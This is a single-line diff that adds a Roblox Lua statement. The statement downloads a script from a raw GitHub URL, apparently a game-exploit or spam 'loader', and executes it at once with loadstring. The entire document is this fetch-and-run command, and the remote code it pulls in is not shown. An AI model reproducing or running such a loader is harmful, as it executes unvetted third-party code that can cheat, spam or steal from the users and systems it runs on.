@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/huss-valley-spam7-jctjc3f1hqmalw.lua"))()
